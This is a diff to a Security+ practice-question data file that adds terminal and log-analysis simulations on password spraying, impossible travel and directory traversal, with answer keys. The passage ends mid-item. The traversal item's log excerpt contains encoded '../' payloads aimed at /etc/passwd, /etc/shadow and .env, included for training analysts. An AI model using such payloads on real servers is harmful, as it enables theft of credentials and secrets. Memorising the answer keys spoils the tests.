@@ -1274,10 +1274,10 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'BEC wire-transfer fraud', estMinutes: 5, archetype: 'incident',
     scenario: 'The CFO\'s assistant received an email that appeared to come from the CEO, urgently requesting a same-day wire transfer to a "new vendor." The domain was one character off from the real company domain. The assistant initiated the transfer before Accounting flagged it.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'mail', label: 'Spoofed "CEO" email arrives requesting urgent wire transfer', time: 'T+0m', severity: 'med' },
-      { id: 's2', icon: 'search', label: 'Assistant does not verify sender domain; replies to confirm details', time: 'T+12m', severity: 'med' },
-      { id: 's3', icon: 'bank', label: 'Wire transfer of $42,000 initiated to attacker-controlled account', time: 'T+40m', severity: 'high' },
-      { id: 's4', icon: 'alert', label: 'Accounting notices the vendor was never onboarded and halts further payments', time: 'T+70m', severity: 'crit' }
+      { id: 's1', icon: 'mail', label: 'Spoofed "CEO" email arrives requesting urgent wire transfer', time: 'T+0m' },
+      { id: 's2', icon: 'search', label: 'Assistant does not verify sender domain; replies to confirm details', time: 'T+12m' },
+      { id: 's3', icon: 'bank', label: 'Wire transfer of $42,000 initiated to attacker-controlled account', time: 'T+40m' },
+      { id: 's4', icon: 'alert', label: 'Accounting notices the vendor was never onboarded and halts further payments', time: 'T+70m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1315,9 +1315,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Ransomware on the file server', estMinutes: 5, archetype: 'incident',
     scenario: 'Employees report they can no longer open shared documents. File names on SRV-FILE now end in ".locked" and a ransom note appears in every folder. The backup server on the same VLAN is also showing signs of encryption activity.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'lock', label: 'Users report shared files renamed with .locked extension', time: 'T+0m', severity: 'high' },
-      { id: 's2', icon: 'note', label: 'Ransom note found in every network share', time: 'T+5m', severity: 'crit' },
-      { id: 's3', icon: 'disk', label: 'Backup server on the same VLAN shows encryption activity starting', time: 'T+9m', severity: 'crit' }
+      { id: 's1', icon: 'lock', label: 'Users report shared files renamed with .locked extension', time: 'T+0m' },
+      { id: 's2', icon: 'note', label: 'Ransom note found in every network share', time: 'T+5m' },
+      { id: 's3', icon: 'disk', label: 'Backup server on the same VLAN shows encryption activity starting', time: 'T+9m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1355,9 +1355,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Volumetric DDoS against the storefront', estMinutes: 4, archetype: 'incident',
     scenario: 'The e-commerce site becomes unreachable. Monitoring shows inbound traffic spiking to 40x baseline from thousands of distinct source IPs, all hitting the homepage with identical GET requests. No unusual database queries or file changes are observed.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'chart', label: 'Inbound traffic spikes to 40x normal baseline', time: 'T+0m', severity: 'high' },
-      { id: 's2', icon: 'globe', label: 'Thousands of distinct source IPs send identical GET requests', time: 'T+2m', severity: 'high' },
-      { id: 's3', icon: 'down', label: 'Web servers become unresponsive; legitimate customers cannot check out', time: 'T+6m', severity: 'crit' }
+      { id: 's1', icon: 'chart', label: 'Inbound traffic spikes to 40x normal baseline', time: 'T+0m' },
+      { id: 's2', icon: 'globe', label: 'Thousands of distinct source IPs send identical GET requests', time: 'T+2m' },
+      { id: 's3', icon: 'down', label: 'Web servers become unresponsive; legitimate customers cannot check out', time: 'T+6m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1440,9 +1440,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Beaconing workstation', estMinutes: 4, archetype: 'incident',
     scenario: 'The SIEM flags a workstation making a DNS query to a newly registered domain every 60 seconds, each time exchanging a small, consistent amount of data. No user is logged in overnight when the beaconing continues.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'radio', label: 'SIEM detects periodic DNS queries to a newly registered domain every 60s', time: 'T+0m', severity: 'med' },
-      { id: 's2', icon: 'moon', label: 'Beaconing continues overnight with no user logged in', time: 'T+8h', severity: 'high' },
-      { id: 's3', icon: 'data', label: 'Small, consistent data exchange on each beacon suggests command-and-control', time: 'T+8h5m', severity: 'high' }
+      { id: 's1', icon: 'radio', label: 'SIEM detects periodic DNS queries to a newly registered domain every 60s', time: 'T+0m' },
+      { id: 's2', icon: 'moon', label: 'Beaconing continues overnight with no user logged in', time: 'T+8h' },
+      { id: 's3', icon: 'data', label: 'Small, consistent data exchange on each beacon suggests command-and-control', time: 'T+8h5m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1525,9 +1525,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Stored XSS harvesting session cookies', estMinutes: 4, archetype: 'incident',
     scenario: 'A support forum\'s comment field was found to store `<script>` tags that quietly send visiting users\' session cookies to an external server. Several customer accounts have since shown logins from unfamiliar locations.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'code', label: 'Malicious script stored in a public comment field', time: 'T-3d', severity: 'med' },
-      { id: 's2', icon: 'cookie', label: 'Script silently exfiltrates visiting users\' session cookies', time: 'T-2d', severity: 'high' },
-      { id: 's3', icon: 'login', label: 'Multiple customer accounts show logins from unfamiliar locations', time: 'T+0m', severity: 'crit' }
+      { id: 's1', icon: 'code', label: 'Malicious script stored in a public comment field', time: 'T-3d' },
+      { id: 's2', icon: 'cookie', label: 'Script silently exfiltrates visiting users\' session cookies', time: 'T-2d' },
+      { id: 's3', icon: 'login', label: 'Multiple customer accounts show logins from unfamiliar locations', time: 'T+0m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1565,9 +1565,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Credential stuffing against the customer login — evidence handling', estMinutes: 4, archetype: 'incident',
     scenario: 'Tens of thousands of login attempts hit the customer login in an hour, using username/password pairs matching a recently leaked third-party breach dump. About 3% succeed. Legal has asked the security team to determine which requests came from which source IPs and to preserve evidence in case law enforcement gets involved.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'list', label: 'Tens of thousands of login attempts in one hour using leaked breach-dump credentials', time: 'T+0m', severity: 'med' },
-      { id: 's2', icon: 'unlock', label: 'About 3% of attempts succeed (password reuse)', time: 'T+35m', severity: 'high' },
-      { id: 's3', icon: 'key', label: 'Successful logins immediately followed by password-reset requests', time: 'T+36m', severity: 'high' }
+      { id: 's1', icon: 'list', label: 'Tens of thousands of login attempts in one hour using leaked breach-dump credentials', time: 'T+0m' },
+      { id: 's2', icon: 'unlock', label: 'About 3% of attempts succeed (password reuse)', time: 'T+35m' },
+      { id: 's3', icon: 'key', label: 'Successful logins immediately followed by password-reset requests', time: 'T+36m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1650,9 +1650,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Malicious vendor software update', estMinutes: 5, archetype: 'incident',
     scenario: 'A routine update from a trusted network-monitoring vendor was pushed to 200 endpoints overnight. The next morning, EDR flags that the updated binary is contacting a command-and-control server not associated with the vendor at all.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'download', label: 'Trusted vendor pushes a routine software update to 200 endpoints', time: 'T-8h', severity: 'low' },
-      { id: 's2', icon: 'shield', label: 'EDR flags the updated binary contacting an unrecognized external server', time: 'T+0m', severity: 'crit' },
-      { id: 's3', icon: 'network', label: 'The same binary is now present across all 200 endpoints', time: 'T+0m', severity: 'crit' }
+      { id: 's1', icon: 'download', label: 'Trusted vendor pushes a routine software update to 200 endpoints', time: 'T-8h' },
+      { id: 's2', icon: 'shield', label: 'EDR flags the updated binary contacting an unrecognized external server', time: 'T+0m' },
+      { id: 's3', icon: 'network', label: 'The same binary is now present across all 200 endpoints', time: 'T+0m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1735,9 +1735,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'DNS cache poisoning redirects the employee portal', estMinutes: 4, archetype: 'incident',
     scenario: 'Employees typing the internal HR portal URL are landing on a convincing fake login page that harvests credentials. The internal DNS resolver\'s cache shows the portal\'s hostname now resolves to an external IP address that was never configured by IT.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'dns', label: 'Internal DNS resolver cache shows the portal hostname resolving to an unfamiliar external IP', time: 'T+0m', severity: 'high' },
-      { id: 's2', icon: 'globe', label: 'Employees are silently redirected to a fake login page', time: 'T+3m', severity: 'high' },
-      { id: 's3', icon: 'key', label: 'Several employees have already entered their credentials on the fake page', time: 'T+15m', severity: 'crit' }
+      { id: 's1', icon: 'dns', label: 'Internal DNS resolver cache shows the portal hostname resolving to an unfamiliar external IP', time: 'T+0m' },
+      { id: 's2', icon: 'globe', label: 'Employees are silently redirected to a fake login page', time: 'T+3m' },
+      { id: 's3', icon: 'key', label: 'Several employees have already entered their credentials on the fake page', time: 'T+15m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1775,9 +1775,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Standard user escalates to domain admin', estMinutes: 5, archetype: 'incident',
     scenario: 'A help-desk technician\'s standard account is observed creating a new account and adding it to the Domain Admins group, an action that account has no legitimate reason to perform. The new account then accesses several servers it has never touched before.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'user', label: 'Help-desk standard account creates a new user account', time: 'T+0m', severity: 'med' },
-      { id: 's2', icon: 'shield', label: 'New account is added to the Domain Admins group', time: 'T+1m', severity: 'crit' },
-      { id: 's3', icon: 'server', label: 'New privileged account accesses multiple servers never touched before', time: 'T+6m', severity: 'crit' }
+      { id: 's1', icon: 'user', label: 'Help-desk standard account creates a new user account', time: 'T+0m' },
+      { id: 's2', icon: 'shield', label: 'New account is added to the Domain Admins group', time: 'T+1m' },
+      { id: 's3', icon: 'server', label: 'New privileged account accesses multiple servers never touched before', time: 'T+6m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1815,9 +1815,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Macro-enabled attachment drops a loader', estMinutes: 4, archetype: 'incident',
     scenario: 'An HR employee opened an attachment titled "Candidate_Resume.docm" and enabled macros when prompted. Within a minute, EDR observed the Office process spawning PowerShell, which downloaded a second-stage payload from a paste site.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'mail', label: 'HR employee opens "Candidate_Resume.docm" and enables macros', time: 'T+0m', severity: 'med' },
-      { id: 's2', icon: 'terminal', label: 'Office process spawns PowerShell (unusual parent-child relationship)', time: 'T+1m', severity: 'high' },
-      { id: 's3', icon: 'download', label: 'PowerShell downloads a second-stage payload from a paste site', time: 'T+1m30s', severity: 'high' }
+      { id: 's1', icon: 'mail', label: 'HR employee opens "Candidate_Resume.docm" and enables macros', time: 'T+0m' },
+      { id: 's2', icon: 'terminal', label: 'Office process spawns PowerShell (unusual parent-child relationship)', time: 'T+1m' },
+      { id: 's3', icon: 'download', label: 'PowerShell downloads a second-stage payload from a paste site', time: 'T+1m30s' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1898,9 +1898,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Disgruntled admin deletes production backups', estMinutes: 5, archetype: 'incident',
     scenario: 'A system administrator who was passed over for promotion used their still-active credentials after hours to delete the last 30 days of production database backups. The deletion was discovered the next morning when a routine restore test failed.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'clock', label: 'Admin logs in after hours using still-active credentials', time: 'T-14h', severity: 'med' },
-      { id: 's2', icon: 'trash', label: '30 days of production database backups deleted', time: 'T-13h45m', severity: 'crit' },
-      { id: 's3', icon: 'alert', label: 'Routine restore test fails the next morning, revealing the deletion', time: 'T+0m', severity: 'crit' }
+      { id: 's1', icon: 'clock', label: 'Admin logs in after hours using still-active credentials', time: 'T-14h' },
+      { id: 's2', icon: 'trash', label: '30 days of production database backups deleted', time: 'T-13h45m' },
+      { id: 's3', icon: 'alert', label: 'Routine restore test fails the next morning, revealing the deletion', time: 'T+0m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -1983,9 +1983,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Broken access control exposes other customers\' orders', estMinutes: 4, archetype: 'incident',
     scenario: 'A customer reports that changing an order ID number in the mobile app\'s API URL let them view a stranger\'s order details, including a shipping address and partial card number. Logs show the same technique being used by dozens of sequential requests from one IP over the past hour.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'bug', label: 'Customer reports viewing another customer\'s order by changing the ID in the URL', time: 'T+0m', severity: 'high' },
-      { id: 's2', icon: 'list', label: 'Logs show dozens of sequential order-ID requests from one IP over the past hour', time: 'T-1h', severity: 'crit' },
-      { id: 's3', icon: 'data', label: 'Exposed data includes shipping addresses and partial card numbers', time: 'T-1h', severity: 'crit' }
+      { id: 's1', icon: 'bug', label: 'Customer reports viewing another customer\'s order by changing the ID in the URL', time: 'T+0m' },
+      { id: 's2', icon: 'list', label: 'Logs show dozens of sequential order-ID requests from one IP over the past hour', time: 'T-1h' },
+      { id: 's3', icon: 'data', label: 'Exposed data includes shipping addresses and partial card numbers', time: 'T-1h' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -2068,9 +2068,9 @@ window.SIM_LAB_SEED_SECPLUS = [
     title: 'Application-layer DDoS against the search API', estMinutes: 4, archetype: 'incident',
     scenario: 'The product search API begins timing out under a flood of expensive, complex search queries sent from a botnet of a few hundred hosts — low in volume compared to a typical flood, but each request consumes significant database CPU. The database server is pegged at 100% CPU.',
     assets: { reference: { kind: 'timeline', stages: [
-      { id: 's1', icon: 'search', label: 'Search API receives a flood of expensive, complex queries from ~300 hosts', time: 'T+0m', severity: 'high' },
-      { id: 's2', icon: 'cpu', label: 'Database server CPU pegged at 100%', time: 'T+4m', severity: 'crit' },
-      { id: 's3', icon: 'down', label: 'Search functionality becomes unusable site-wide', time: 'T+6m', severity: 'crit' }
+      { id: 's1', icon: 'search', label: 'Search API receives a flood of expensive, complex queries from ~300 hosts', time: 'T+0m' },
+      { id: 's2', icon: 'cpu', label: 'Database server CPU pegged at 100%', time: 'T+4m' },
+      { id: 's3', icon: 'down', label: 'Search functionality becomes unusable site-wide', time: 'T+6m' }
     ] } },
     steps: [
       { id: 't1', type: 'configure', points: 1,
@@ -2995,6 +2995,3543 @@ window.SIM_LAB_SEED_SECPLUS = [
           symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
           mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
         answer: { slots: { 'a-local': ['ev'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espgcm'], 'b-local': ['pool'], 'b-remote': ['ev'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espgcm'] } } }
+    ]
+  },
+
+  // ===== v8.156.0 — terminal / log-analysis PBQs (cli), SY0-701 2.4 4.4 4.9; two-reviewer gate passed 2026-10-11 =====
+  {
+    "id": "sp-cli-01",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "2.4",
+    "topic": "Log investigation — authentication",
+    "title": "Overnight sign-in failures on the jump host",
+    "estMinutes": 6,
+    "scenario": "Overnight, the SIEM flagged a jump in failed SSH sign-ins on JUMP-01, the internet-facing Linux jump host that administrators use to reach internal servers. Accounts lock after 5 failed attempts in 15 minutes. You have a shell on JUMP-01. Run the commands that show what the failures were and whether any of them worked, then decide what happened and what to do first.",
+    "cliFault": {
+      "fault": "spray"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "JUMP-01",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "uptime",
+            "necessary": false,
+            "promptLine": "uptime",
+            "reveal": "uptime",
+            "lines": [
+              {
+                "text": " 07:58:12 up 3 days,  1:46,  1 user,  load average: 0.08, 0.05, 0.01"
+              }
+            ]
+          },
+          {
+            "id": "fails",
+            "necessary": true,
+            "promptLine": "grep \"Failed password\" /var/log/auth.log | grep 203.0.113.77 | head -n 6",
+            "reveal": "fails",
+            "lines": [
+              {
+                "text": "Oct  8 02:14:07 jump-01 sshd[48211]: Failed password for aboyd from 203.0.113.77 port 50412 ssh2"
+              },
+              {
+                "text": "Oct  8 02:14:39 jump-01 sshd[48219]: Failed password for achen from 203.0.113.77 port 50468 ssh2"
+              },
+              {
+                "text": "Oct  8 02:15:11 jump-01 sshd[48230]: Failed password for adavies from 203.0.113.77 port 50533 ssh2"
+              },
+              {
+                "text": "Oct  8 02:15:43 jump-01 sshd[48241]: Failed password for invalid user admin1 from 203.0.113.77 port 50590 ssh2"
+              },
+              {
+                "text": "Oct  8 02:16:15 jump-01 sshd[48252]: Failed password for afarah from 203.0.113.77 port 50641 ssh2"
+              },
+              {
+                "text": "Oct  8 02:16:47 jump-01 sshd[48260]: Failed password for agomez from 203.0.113.77 port 50702 ssh2"
+              }
+            ]
+          },
+          {
+            "id": "who",
+            "necessary": false,
+            "promptLine": "who",
+            "reveal": "who",
+            "lines": [
+              {
+                "text": "analyst  pts/0        2026-10-08 07:52 (10.20.0.15)"
+              }
+            ]
+          },
+          {
+            "id": "peruser",
+            "necessary": true,
+            "promptLine": "grep \"Failed password\" /var/log/auth.log | grep 203.0.113.77 | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn | head -n 4",
+            "reveal": "peruser",
+            "lines": [
+              {
+                "text": "      2 zwright"
+              },
+              {
+                "text": "      2 ytanaka"
+              },
+              {
+                "text": "      2 xmorgan"
+              },
+              {
+                "text": "      2 wjones"
+              }
+            ]
+          },
+          {
+            "id": "accepted",
+            "necessary": true,
+            "promptLine": "grep \"Accepted\" /var/log/auth.log | grep 203.0.113.77",
+            "reveal": "accepted",
+            "lines": [
+              {
+                "text": "Oct  8 03:09:31 jump-01 sshd[49907]: Accepted password for mlopez from 203.0.113.77 port 53318 ssh2"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what the failed sign-ins were and whether any of them succeeded.",
+        "explanation": "The raw failures show one outside address, 203.0.113.77, trying a different account roughly every 30 seconds. The per-account count is the deciding output: it is sorted highest first and the top count is 2, so no account came near the lockout limit of 5. The Accepted line shows that one of those guesses worked, for mlopez. `uptime` and `who` describe the host and who is on it now, not what happened overnight.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "fails",
+            "peruser",
+            "accepted"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What happened, and what should you do first?",
+        "explanation": "Password spraying tries one or two common passwords against a long list of accounts, slowly, so no single account reaches the lockout limit. The per-account count shows exactly that: 2 failures each against a limit of 5. Brute force is the trap. It hammers one account, so you would see a large count against a single name and a lockout. The traffic is also far too slow to be a flood, and nothing was replayed. One guess worked, so contain mlopez first: reset the password, end any sessions and block the source. A lower lockout threshold does nothing for an account that is already open, and it would start locking out real users. Afterwards, MFA or key-only SSH on the jump host stops this kind of attack.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What happened",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Brute force: hundreds of guesses against one account until it opened"
+                },
+                {
+                  "id": "b",
+                  "text": "Password spraying: a couple of guesses each across many accounts"
+                },
+                {
+                  "id": "c",
+                  "text": "Denial of service: a connection flood meant to take SSH offline"
+                },
+                {
+                  "id": "d",
+                  "text": "Credential replay: a captured admin session reused from outside"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "First response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Lower the lockout threshold from 5 to 2 failed attempts for all accounts"
+                },
+                {
+                  "id": "b",
+                  "text": "Lock the root account, since root is the usual target"
+                },
+                {
+                  "id": "c",
+                  "text": "Reset mlopez's password, end its sessions, block the source"
+                },
+                {
+                  "id": "d",
+                  "text": "Rate-limit SSH connections on the jump host to absorb the flood"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "b",
+            "fix": "c"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-02",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "2.4",
+    "topic": "Log investigation — sign-in activity",
+    "title": "Risk alert on a finance manager's account",
+    "estMinutes": 6,
+    "scenario": "The identity provider raised a risk alert on rosei@corp.example, a finance manager who works from the Manchester office. She says she has had no trouble signing in this morning. From the SOC console you can query the sign-in, session, device and account records. Find out what the alert is about, then decide what it means and what to do first.",
+    "cliFault": {
+      "fault": "impossibleTravel"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "SOC-CONSOLE",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "account",
+            "necessary": false,
+            "promptLine": "logq account user=rosei@corp.example",
+            "reveal": "account",
+            "lines": [
+              {
+                "text": "Account:            rosei@corp.example"
+              },
+              {
+                "text": "Status:             enabled"
+              },
+              {
+                "text": "Password last set:  2026-08-14 09:12 UTC"
+              },
+              {
+                "text": "Groups:             Finance-Managers, Payment-Approvers"
+              }
+            ]
+          },
+          {
+            "id": "signins",
+            "necessary": true,
+            "promptLine": "logq signins user=rosei@corp.example since=-12h",
+            "reveal": "signins",
+            "lines": [
+              {
+                "text": "TIME (UTC)           RESULT   SOURCE IP       LOCATION          DEVICE"
+              },
+              {
+                "text": "2026-10-07 08:02:14  SUCCESS  198.51.100.24   Manchester, GB    LT-MCR-0417 (registered)"
+              },
+              {
+                "text": "2026-10-07 08:39:51  SUCCESS  203.0.113.140   Singapore, SG     unregistered"
+              },
+              {
+                "text": "2026-10-07 08:40:03  SUCCESS  203.0.113.140   Singapore, SG     unregistered"
+              }
+            ]
+          },
+          {
+            "id": "devices",
+            "necessary": false,
+            "promptLine": "logq devices user=rosei@corp.example",
+            "reveal": "devices",
+            "lines": [
+              {
+                "text": "DEVICE          TYPE     STATUS      LAST SEEN (UTC)"
+              },
+              {
+                "text": "LT-MCR-0417     laptop   compliant   2026-10-07 08:02"
+              },
+              {
+                "text": "PH-ROSEI-02     phone    compliant   2026-10-07 07:40"
+              }
+            ]
+          },
+          {
+            "id": "sessions",
+            "necessary": true,
+            "promptLine": "logq sessions user=rosei@corp.example state=open",
+            "reveal": "sessions",
+            "lines": [
+              {
+                "text": "SESSION   STARTED (UTC)        SOURCE IP       LOCATION         STATE"
+              },
+              {
+                "text": "s-71c2    2026-10-07 08:02:14  198.51.100.24   Manchester, GB   active"
+              },
+              {
+                "text": "s-9f40    2026-10-07 08:39:51  203.0.113.140   Singapore, SG    active"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what the alert is about and whether the problem is still live.",
+        "explanation": "The sign-in log holds the alert: two successful sign-ins 37 minutes apart, one from Manchester on her registered laptop and one from Singapore on a device that is not registered to her. Those cities are about 10,900 km apart. The session list shows the Singapore session is still active right now, which shapes the response. The account record and the device list describe her setup. The device list only repeats what the device column in the sign-in log already tells you.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "signins",
+            "sessions"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What does the alert mean, and what should you do first?",
+        "explanation": "Nobody gets from Manchester to Singapore in 37 minutes, so two successful sign-ins that far apart mean two different people are using the account. That is impossible travel. The business-trip answer fails on time. The VPN answer fails because the Singapore sign-in came from an unregistered device, not her laptop, and her laptop session stayed in Manchester. There are no failed attempts at all, so it is not spraying. The trap is resetting the password and stopping there. A reset stops new sign-ins, but the Singapore session that is already open can keep working until it is revoked, so do both together. Trusting the address or only geo-blocking leaves the attacker signed in.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What it means",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Impossible travel: someone else is signing in with her credentials"
+                },
+                {
+                  "id": "b",
+                  "text": "She is on a business trip and signed in from her hotel in Singapore"
+                },
+                {
+                  "id": "c",
+                  "text": "Her laptop's VPN client routed one of her own sign-ins through Singapore"
+                },
+                {
+                  "id": "d",
+                  "text": "Password spraying that has not yet got into the account"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "First response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Reset her password, tell her to pick a stronger one and close the alert"
+                },
+                {
+                  "id": "b",
+                  "text": "Reset her password and revoke all of her active sessions"
+                },
+                {
+                  "id": "c",
+                  "text": "Add 203.0.113.140 to the trusted locations list"
+                },
+                {
+                  "id": "d",
+                  "text": "Block all sign-ins from Singapore and take no other action for now"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "a",
+            "fix": "b"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-03",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "2.4",
+    "topic": "Log investigation — web server",
+    "title": "Odd requests to the statement download page",
+    "estMinutes": 7,
+    "scenario": "Customers download their statements from https://portal.example.com/download.php?file=<name>. This afternoon the SIEM flagged a burst of unusual requests to that page from 203.0.113.52. You have a shell on the web server, WEB-01. Find out what the requests were trying to do and whether they worked, then decide what happened and what to do.",
+    "cliFault": {
+      "fault": "traversal"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "WEB-01",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "svc",
+            "necessary": false,
+            "promptLine": "systemctl status web --no-pager | head -n 3",
+            "reveal": "svc",
+            "lines": [
+              {
+                "text": "● web.service - Customer portal web server"
+              },
+              {
+                "text": "     Loaded: loaded (/etc/systemd/system/web.service; enabled)"
+              },
+              {
+                "text": "     Active: active (running) since Fri 2026-10-02 22:10:04 UTC; 3 days ago"
+              }
+            ]
+          },
+          {
+            "id": "access",
+            "necessary": true,
+            "promptLine": "grep \"download.php\" /var/log/web/access.log | grep 203.0.113.52",
+            "reveal": "access",
+            "lines": [
+              {
+                "text": "203.0.113.52 - - [06/Oct/2026:14:02:11 +0000] \"GET /download.php?file=statement-10442-0925.pdf HTTP/1.1\" 200 48211"
+              },
+              {
+                "text": "203.0.113.52 - - [06/Oct/2026:14:02:19 +0000] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 403 199"
+              },
+              {
+                "text": "203.0.113.52 - - [06/Oct/2026:14:02:26 +0000] \"GET /download.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\" 200 2304"
+              },
+              {
+                "text": "203.0.113.52 - - [06/Oct/2026:14:02:31 +0000] \"GET /download.php?file=..%2f..%2f..%2f..%2fetc%2fshadow HTTP/1.1\" 404 196"
+              },
+              {
+                "text": "203.0.113.52 - - [06/Oct/2026:14:02:40 +0000] \"GET /download.php?file=..%2f..%2fapp%2f.env HTTP/1.1\" 200 911"
+              }
+            ]
+          },
+          {
+            "id": "files",
+            "necessary": false,
+            "promptLine": "ls -l /var/www/html/files | head -n 3",
+            "reveal": "files",
+            "lines": [
+              {
+                "text": "total 18244"
+              },
+              {
+                "text": "-rw-r----- 1 www-data www-data 48211 Oct  1 09:00 statement-10442-0925.pdf"
+              },
+              {
+                "text": "-rw-r----- 1 www-data www-data 51007 Oct  1 09:00 statement-10443-0925.pdf"
+              }
+            ]
+          },
+          {
+            "id": "errlog",
+            "necessary": true,
+            "promptLine": "grep 203.0.113.52 /var/log/web/error.log",
+            "reveal": "errlog",
+            "lines": [
+              {
+                "text": "[2026-10-06 14:02:31] [warn] [client 203.0.113.52] readfile(/var/www/html/files/../../../../etc/shadow): Failed to open stream: Permission denied in /var/www/html/download.php on line 14"
+              }
+            ]
+          },
+          {
+            "id": "last",
+            "necessary": false,
+            "promptLine": "last -n 2",
+            "reveal": "last",
+            "lines": [
+              {
+                "text": "webadm   pts/0    10.20.0.31    Tue Oct  6 09:14 - 09:40  (00:26)"
+              },
+              {
+                "text": "webadm   pts/0    10.20.0.31    Mon Oct  5 16:02 - 16:20  (00:18)"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what the requests were after and what the server actually did with them.",
+        "explanation": "The access log shows the requests: one normal statement download, then the file parameter climbing out of the folder with ../. The plain version got a 403, but the URL-encoded version (%2f is a slash) got a 200 and 2,304 bytes of /etc/passwd, and .env came back with 911 bytes. The error log proves the parameter reaches the file system unchecked: download.php tried to open /etc/shadow, and only the operating system's file permissions stopped it. The service status, the folder listing and the admin logins do not show the attack.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "access",
+            "errlog"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What happened, and what is the right fix?",
+        "explanation": "Every malicious request uses ../ to step up out of the download folder towards /etc and the app's own config. That is directory traversal. No request contains SQL syntax or a script tag, and the attacker is not guessing statement names. The trap is the ../ filter: this site already had one, and the log shows the attacker beat it by URL-encoding the slash. The real fix is to check the requested name against an allow-list of files the page may serve, or to resolve the full path and reject anything outside the folder. Because .env was downloaded, treat its database password and API keys as stolen and rotate them.",
